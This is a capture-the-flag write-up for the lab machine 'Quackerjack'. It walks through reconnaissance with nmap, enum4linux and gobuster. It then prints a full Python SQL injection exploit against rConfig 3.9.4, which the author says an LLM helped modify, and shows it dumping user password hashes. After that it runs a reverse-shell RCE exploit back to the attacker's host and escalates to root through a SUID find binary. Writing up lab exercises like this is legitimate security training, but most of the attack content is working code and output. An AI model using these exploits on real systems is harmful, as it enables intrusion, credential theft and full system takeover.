# CTF Writeup: Quackerjack

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.130.57 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 02:15 EST
Nmap scan report for 192.168.130.57
Host is up (0.031s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.221
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)
|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-title: Apache HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB 10.3.23 or earlier (unauthorized)
8081/tcp open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: QUACKERJACK; OS: Unix

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m01s, deviation: 2h53m14s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-28T07:16:15
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: quackerjack
|   NetBIOS computer name: QUACKERJACK\x00
|   Domain name: \x00
|   FQDN: quackerjack
|_  System time: 2025-12-28T02:16:16-05:00

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   32.57 ms 192.168.45.1
2   32.60 ms 192.168.45.254
3   32.67 ms 192.168.251.1
4   32.69 ms 192.168.130.57

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.77 seconds
```

Let's start of by enumerating smb.

Ran enum4linux.

```
enum4linux -a 192.168.130.57                                                   
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 28 02:22:20 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.130.57
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.130.57 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 192.168.130.57 )===============================

Looking up status of 192.168.130.57
No reply from 192.168.130.57

 ==================================( Session Check on 192.168.130.57 )==================================


[+] Server 192.168.130.57 allows sessions using username '', password ''


 ===============================( Getting domain SID for 192.168.130.57 )===============================

Domain Name: SAMBA                                                                                                                            
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                          
                                                                                                                                              
                                                                                                                                              
 ==================================( OS information on 192.168.130.57 )==================================
                                                                                                                                              
                                                                                                                                              
[E] Can't get OS info with smbclient                                                                                                          
                                                                                                                                              
                                                                                                                                              
[+] Got OS info for 192.168.130.57 from srvinfo:                                                                                              
        QUACKERJACK    Wk Sv PrQ Unx NT SNT Samba 4.10.4                                                                                      
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ======================================( Users on 192.168.130.57 )======================================
                                                                                                                                              
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                       
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ================================( Share Enumeration on 192.168.130.57 )================================
                                                                                                                                              
                                                                                                                                              
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.10.4)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        SAMBA                

[+] Attempting to map shares on 192.168.130.57                                                                                                
                                                                                                                                              
//192.168.130.57/print$ Mapping: DENIED Listing: N/A Writing: N/A                                                                             

[E] Can't understand response:                                                                                                                
                                                                                                                                              
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                    
//192.168.130.57/IPC$   Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.130.57 )===========================
                                                                                                                                              
Password:                                                                                                                                     


[+] Attaching to 192.168.130.57 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] QUACKERJACK
        [+] Builtin

[+] Password Info for Domain: QUACKERJACK

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                          
                                                                                                                                              
                                                                                                                                              
Password Complexity: Disabled                                                                                                                 
Minimum Password Length: 5


 ======================================( Groups on 192.168.130.57 )======================================
                                                                                                                                              
                                                                                                                                              
[+] Getting builtin groups:                                                                                                                   
                                                                                                                                              
                                                                                                                                              
[+]  Getting builtin group memberships:                                                                                                       
                                                                                                                                              
                                                                                                                                              
[+]  Getting local groups:                                                                                                                    
                                                                                                                                              
                                                                                                                                              
[+]  Getting local group memberships:                                                                                                         
                                                                                                                                              
                                                                                                                                              
[+]  Getting domain groups:                                                                                                                   
                                                                                                                                              
                                                                                                                                              
[+]  Getting domain group memberships:                                                                                                        
                                                                                                                                              
                                                                                                                                              
 =================( Users on 192.168.130.57 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                                              
                                                                                                                                              
[I] Found new SID:                                                                                                                            
S-1-22-1                                                                                                                                      

[I] Found new SID:                                                                                                                            
S-1-5-32                                                                                                                                      

[I] Found new SID:                                                                                                                            
S-1-5-32                                                                                                                                      

[I] Found new SID:                                                                                                                            
S-1-5-32                                                                                                                                      

[I] Found new SID:                                                                                                                            
S-1-5-32                                                                                                                                      

[+] Enumerating users using SID S-1-5-21-358648085-943178687-145195208 and logon username '', password ''                                     
                                                                                                                                              
S-1-5-21-358648085-943178687-145195208-501 QUACKERJACK\nobody (Local User)                                                                    
S-1-5-21-358648085-943178687-145195208-513 QUACKERJACK\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                   
                                                                                                                                              
                                                                                                                                              

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                   
                                                                                                                                              
                                                                                                                                              
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ==============================( Getting printer info for 192.168.130.57 )==============================
                                                                                                                                              
No printers returned.                                                                                                                         


enum4linux complete on Sun Dec 28 02:25:14 2025
```

Enumerated shares.

```
smbclient -L \\\\192.168.130.57                                         
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.10.4)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        SAMBA
```

Let's move onto checking RPC.

```
rpcclient -U''%'' 192.168.130.57
rpcclient $> querydispinfo
```

Couldn't retrieve any information from RPC & SMB. Let's move onto inspecting ftp.

```
ftp 192.168.130.57
Connected to 192.168.130.57.
220 (vsFTPd 3.0.2)
Name (192.168.130.57:saitama): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||15860|).
^C
receive aborted. Waiting for remote to finish abort.
ftp> ls -la
229 Entering Extended Passive Mode (|||26809|).
```

The Shell Session get's stuck when trying to view files.

Let's move onto checking out the website running on port 80.

Upon analyzing the webpage it seems to be an unconfigured website powered by CentOS.

Enumerated endpoints, but couldn't find anything.

```
gobuster dir -u http://192.168.130.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                            
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.130.57
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 48114 / 220558 (21.81%)^C
```

Mapped target ip to domain "quackerjack.pg" in our local dns file /etc/hosts.

```
sudo echo "192.168.130.57 quackerjack.pg" | sudo tee -a /etc/hosts
```

Tried enumerating subdomains, but didn't find anything.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://quackerjack.pg -H "Host: FUZZ.quackerjack.pg" -fs 4897

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://quackerjack.pg
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.quackerjack.pg
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4897
________________________________________________

[WARN] Caught keyboard interrupt (Ctrl-C)
```

The webpage on port 8081 seems very promising it's utilizing an application called "rConfig" version 3.9.4 which acts as an CMS. It also provides an login panel.

## Vulnerability Assessment

Let's search up for CVE's.

```
searchsploit rConfig 3.9.4
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
rConfig 3.9 - 'searchColumn' SQL Injection                                                                  | php/webapps/48208.py
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection                                                  | php/webapps/48241.py
rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution                                    | php/webapps/48261.py
Rconfig 3.x - Chained Remote Code Execution (Metasploit)                                                    | linux/remote/48223.rb
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Let's utilize the SQLi exploit first, since the RCE Exploits need credentials for it to work.

The Exploit didn't work so I used DeepSeek LLM in order to modify the script slightly.

```
#!/usr/bin/python3
import requests
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings for self-signed certificates
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print ("rconfig 3.9 - SQL Injection PoC")
if len(sys.argv) != 2:
    print ("[+] Usage : ./rconfig_exploit.py https://target")
    exit()

vuln_page="/commands.inc.php"
vuln_parameters="?searchOption=contains&searchField=vuln&search=search&searchColumn=command"
given_target = sys.argv[1]
target =  given_target
target += vuln_page
target += vuln_parameters

# Create a session and disable SSL verification for all requests
request = requests.session()
request.verify = False

# Also disable SSL verification for this specific request
dashboard_request = request.get(target, allow_redirects=False, verify=False)


def extractDBinfos(myTarget=None,myPayload=None):
    """
    Extract information from database
    Args:
        - target+payload (String)
    Returns:
        - payload result (String)
    """
    result = ""
    encoded_request = myTarget+myPayload
    exploit_req = request.get(encoded_request, verify=False)
    if '[PWN]' in str(exploit_req.content):
        result = str(exploit_req.content).split('[PWN]')[1]
    else:
        result="Maybe no more information ?"

    return result


if dashboard_request.status_code != 404:
    print ("[+] Triggering the payloads on "+given_target+vuln_page)
    # get the db name
    print ("[+] Extracting the current DB name :")
    db_payload = "%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)%20limit%200,1),NULL--"
    db_name = extractDBinfos(target,db_payload)
    print (db_name)
    # DB extract users
    print ("[+] Extracting 10 first users :")
    for i in range (0, 10):
            user1_payload="%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,username,0x3A,id,0x3A,password,0x5B50574E5D3C42523E)%20FROM%20"+db_name+".users+limit+"+str(i)+","+str(i+1)+"),NULL--"
            user_h = extractDBinfos(target,user1_payload)
            #print ("[+] Dump device "+str(i))
            print (user_h)
    # DB extract devices information
    print ("[+] Extracting 10 first devices :")
    for i in range (0, 10):
            device_payload="%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,deviceName,0x3A,deviceIpAddr,0x3A,deviceUsername,0x3A,devicePassword,0x3A,deviceEnablePassword,0x5B50574E5D3C42523E)%20FROM%20"+db_name+".nodes+limit+"+str(i)+","+str(i+1)+"),NULL--"
            device_h = extractDBinfos(target,device_payload)
            #print ("[+] Dump device "+str(i))
            print (device_h)

    print ("Done")

else:
    print ("[-] Please verify the URI")
    exit()
```

After running the script we gained an encoded password for user "admin".

```
python3 sqli_exploit.py https://quackerjack.pg:8081
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://quackerjack.pg:8081/commands.inc.php
[+] Extracting the current DB name :
rconfig
[+] Extracting 10 first users :
admin:1:dc40b85276a1f4d7cb35f154236aa1b2
nidgafryzt:326:21232f297a57a5a743894a0e4a801fc3
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
[+] Extracting 10 first devices :
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Done
```

Cracked the password hash on www.crackstation.net 

```
admin:abgrtyu
```

Since we now got credentials let's utilize the remote command execution exploit.

Started up my listener on port 80.

```
nc -lvnp 80
```

Ran the exploit.

```
python3 48241.py https://quackerjack.pg:8081 admin abgrtyu 192.168.45.221 80
```

Gained RCE as user "apache".

```
nc -lvnp 80                                                 
listening on [any] 80 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.130.57] 57802
bash: no job control in this shell
bash-4.2$
```

## Privilege Escalation

Discovered that there are no users on the system, besides user "root".

```
bash-4.2$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
```

Enumerated SUID Binaries on the target server.

```
bash-4.2$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/usr/bin/find
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

Utilized the /usr/bin/find SUID Binary and the PoC from www.gtfobins.github.io in order to escalate my privs to root.

```
bash-4.2$ /usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/find . -exec /bin/sh -p \; -quit
whoami
root
```

Retrieved local.txt in /home/rconfig directory.

```
af1b9d1d5a8b5907f7e22b3eb74cca49
```

Retrieved proof.txt in /root directory.

```
bfb8a18ef38dcef6d8effdf1d17294c2
```
